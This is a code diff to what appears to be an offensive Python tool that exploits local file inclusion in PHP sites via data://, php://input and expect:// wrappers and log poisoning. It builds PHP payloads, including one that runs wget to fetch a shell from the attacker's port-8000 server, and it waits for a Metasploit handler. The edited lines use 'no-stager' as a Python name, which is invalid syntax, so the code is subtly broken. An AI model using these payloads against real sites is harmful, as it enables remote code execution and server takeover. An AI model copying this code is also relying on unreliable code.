@@ -31,9 +31,10 @@ def progressbar():
 
 class Data:
 
-    def __init__(self, target):
+    def __init__(self, target, no-stager):
 
         self.target = target
+        self.no-stager = no-stager
 
     def execute_data(self):
 
@@ -67,7 +68,7 @@ class Data:
             print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)
 
             # Build payload
-            if args.no-stager:
+            if self.no-stager:
                 payload_file = open("/tmp/{0}.php".format(shell),"r")
                 payload = payload_file.read()
                 payload_file.close()
@@ -79,7 +80,7 @@ class Data:
             data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
             lfi = self.target + data_wrapper
 
-            if args.no-stager:
+            if self.no-stager:
                 raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...")
             else:
                 # Assuming if there is a server running on port 8000 hosting from /tmp
@@ -104,9 +105,10 @@ class Data:
 
 class Input:
 
-    def __init__(self, target):
+    def __init__(self, target, no-stager):
 
         self.target = target
+        self.no-stager = no-stager
 
     def execute_input(self):
 
@@ -143,14 +145,14 @@ class Input:
         # Build php payload
         wrapper = "php://input"
         url = self.target + wrapper
-        if args.no-stager:
+        if self.no-stager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = payload_file.read()
             payload_file.close()
         else:
             payload = "<?php system('wget http://%s:8000/{0}.php'); ?>".format(shell)
             
-        if args.no-stager:
+        if self.no-stager:
             raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
         else: 
             # Assuming if there is a server running on port 8000 hosting from /tmp
@@ -173,9 +175,10 @@ class Input:
 
 class Expect:
 
-    def __init__(self, target):
+    def __init__(self, target, no-stager):
 
         self.target = target
+        self.no-stager = no-stager
 
     def execute_expect(self):
 
@@ -205,7 +208,7 @@ class Expect:
             print(t.green(" [*] ") + "Success!")
 
         # Build payload
-        if args.no-stager:
+        if self.no-stager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "expect://echo \"\\" + payload_file.read() + "\" | php"
             payload_file.close()
@@ -264,7 +267,7 @@ class Logs:
         else:
             print(t.green(" [*] ") + "Success!")
 
-        if args.no-stager:
+        if self.no-stager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = payload_file.read()
             payload_file.close()
